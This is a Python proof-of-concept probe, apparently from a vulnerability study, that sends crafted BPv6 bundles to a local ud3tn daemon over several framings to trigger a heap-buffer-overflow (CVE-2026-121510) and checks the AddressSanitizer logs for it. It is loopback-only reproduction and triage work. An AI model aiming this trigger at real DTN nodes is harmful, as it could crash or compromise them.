#!/usr/bin/env python3
"""Loopback-only transport reachability probe for the BPv6 admin-record bug.

Starts one pinned ud3tn daemon bound to 127.0.0.1, sends one or more bundles
with the CVE-2026-121510 admin record using a selected CLA framing, captures
daemon stdout+stderr, and tears the daemon down. No off-loopback traffic.

Examples:
  python3 transport_probe.py --label mtcp-vuln-0 --build vuln \
      --transport mtcp --port 24031 --eid-len 0
  python3 transport_probe.py --label tcpcl-vuln-0 --build vuln \
      --transport tcpclv3 --port 24041 --eid-len 0
"""
import argparse
import json
import os
import pathlib
import socket
import subprocess
import sys
import time

HERE = pathlib.Path(__file__).resolve().parent
HARNESS = HERE.parent / "harness"
sys.path.insert(0, str(HARNESS))
from wire_trigger import cbor_byte_string_header, sdnv_encode  # noqa: E402
from gdb_probe import make_variable_bundle  # noqa: E402

SRC = HERE.parent / "src"
BINARIES = {
    "vuln": SRC / "ud3tn-v0.15.1/build/posix/ud3tn",
    "fixed": SRC / "ud3tn-v0.15.2/build/posix/ud3tn",
    "plain": SRC / "ud3tn-v0.15.1-plain/build/posix/ud3tn",
}


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError("daemon closed during header")
        buf.extend(chunk)
    return bytes(buf)


def tcpclv3_handshake(sock):
    # Daemon sends its contact header first: "dtn!" + version 3 + flags 0 +
    # keepalive 0x0000 + SDNV(EID length) + EID string (proto.c:41-62).
    head = recv_exact(sock, 8)
    assert head[:4] == b"dtn!" and head[4] >= 3, head.hex()
    first = recv_exact(sock, 1)[0]
    assert first < 0x80, "multi-byte SDNV in daemon EID length unsupported"
    peer_eid_len = first
    peer_eid = recv_exact(sock, peer_eid_len)
    # Client header: same 8 bytes, then our EID's SDNV length and EID.
    eid = b"dtn://attacker.dtn/"
    sock.sendall(head[:8] + sdnv_encode(len(eid)) + eid)
    return head.hex(), peer_eid.decode("ascii", "replace")


def frame_bundle(transport, bundle):
    if transport in ("mtcp", "smtcp"):
        # CBOR byte-string header (wire_trigger.cbor_byte_string_header).
        n = len(bundle)
        hdr = bytes([0x58, n]) if n < 256 else bytes([0x59, n >> 8, n & 0xFF])
        return hdr + bundle
    # tcpclv3 and STCP-style framing carry the raw bundle, without MTCP's
    # CBOR byte-string header.
    raw = bundle[2:]
    if transport == "tcpclv3":
        # DATA_SEGMENT with S and E flags (0x13) + SDNV length + raw bundle.
        return bytes([0x13]) + sdnv_encode(len(raw)) + raw
    if transport == "mtcp-stcp4":
        # ION STCP-style 4-byte length prefix (compile-time flag is 0 in the
        # pinned builds: a negative control, not a supported framing here).
        return len(raw).to_bytes(4, "big") + raw
    if transport == "mtcp-raw":
        # Raw bundle bytes with no MTCP CBOR framing ("plain TCP" negative).
        return raw
    if transport == "tcpspp":
        # SPP primary (APID 1, unsegmented, secondary header present) +
        # 5-byte timecode secondary header + raw bundle + 2 CRC bytes.
        # CRC is not verified by the RX parser (cla_tcpspp.c:136-166).
        length = len(raw) + 5 + 2 - 1
        primary = bytes([0x08, 0x01, 0xc0, 0x00]) + length.to_bytes(2, "big")
        timecode = bytes([0x1c]) + int(time.time()).to_bytes(4, "big")
        return primary + timecode + raw + b"\x00\x00"
    raise ValueError(transport)


def run_case(label, build, transport, port, eid_len, count, marker, seq,
             repeat, outdir, wire_file=None, timeout=8):
    outdir.mkdir(parents=True, exist_ok=True)
    binary = BINARIES[build]
    assert binary.is_file(), binary
    logpath = outdir / (label + ".log")
    if transport == "tcpspp":
        cla = f"tcpspp:127.0.0.1,{port},false,1"
    else:
        cla = f"{transport.split('-')[0]}:127.0.0.1,{port}" \
              + (",false" if transport == "smtcp" else "")
    cmd = [
        str(binary), "-b", "6", "-e", "dtn://ud3tn.dtn/",
        "-c", cla,
        "-s", str(outdir / (label + ".aap.sock")),
        "-S", str(outdir / (label + ".aap2.sock")),
        "-L", "4",
    ]
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1:symbolize=1"
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, env=env, text=True)
    frames = []
    error = None
    handshake = None
    try:
        deadline = time.time() + 5
        sock = None
        while time.time() < deadline:
            if proc.poll() is not None:
                error = "daemon exited before listen"
                break
            try:
                sock = socket.create_connection(("127.0.0.1", port), timeout=1)
                break
            except OSError:
                time.sleep(0.1)
        if sock is not None:
            with sock:
                sock.settimeout(2)
                if transport == "tcpclv3":
                    handshake = tcpclv3_handshake(sock)
                for i in range(repeat):
                    if wire_file is None:
                        wire = make_variable_bundle(marker, count, eid_len,
                                                    (seq + i) & 0x7F)
                    else:
                        raw = pathlib.Path(wire_file).read_bytes()
                        wire = cbor_byte_string_header(len(raw)) + raw
                    frame = frame_bundle(transport, wire)
                    sock.sendall(frame)
                    frames.append(len(frame))
                try:
                    sock.recv(4096)
                except OSError:
                    pass
            time.sleep(1.5)
    except Exception as exc:
        error = f"{type(exc).__name__}: {exc}"
    finally:
        if proc.poll() is None:
            proc.terminate()
        try:
            out, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
    logpath.write_text(out)
    hit = "heap-buffer-overflow" in out and "reports.c:439" in out
    asan_any = "AddressSanitizer" in out
    summary = [ln for ln in out.splitlines()
               if "AddressSanitizer" in ln or "heap-buffer-overflow" in ln
               or "SUMMARY:" in ln or "WRITE of size" in ln
               or "Handshake performed" in ln or "Received administrative" in ln
               or "CLA" in ln and "Unable" in ln]
    result = {
        "label": label, "build": build, "transport": transport,
        "eid_len": eid_len, "count": count, "marker": f"0x{marker:02x}",
        "seqs": list(range(seq, seq + repeat)), "rc": proc.returncode,
        "asan_reports_439": hit, "asan_any": asan_any,
        "frames_bytes": frames, "error": error,
        "handshake": handshake, "log": str(logpath),
        "cmd": " ".join(cmd), "summary": summary[:12],
    }
    (outdir / (label + ".json")).write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps({k: result[k] for k in (
        "label", "build", "transport", "eid_len", "rc",
        "asan_reports_439", "asan_any", "frames_bytes", "error", "log")}))
    for ln in summary[:8]:
        print("   ", ln)
    return result


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--label", required=True)
    ap.add_argument("--build", choices=BINARIES, required=True)
    ap.add_argument("--transport", choices=(
        "mtcp", "smtcp", "tcpclv3", "tcpspp", "mtcp-stcp4", "mtcp-raw"), required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--eid-len", type=int, default=0)
    ap.add_argument("--count", type=int, default=64)
    ap.add_argument("--marker", type=int, default=0x41)
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--wire-file", help="raw bundle bytes to send instead of the BPv6 PoC")
    ap.add_argument("--outdir", default=str(HERE))
    args = ap.parse_args()
    assert args.port >= 24000, "use unique ports >= 24000"
    run_case(args.label, args.build, args.transport, args.port,
             args.eid_len, args.count, args.marker, args.seq, args.repeat,
             pathlib.Path(args.outdir), wire_file=args.wire_file)


if __name__ == "__main__":
    main()
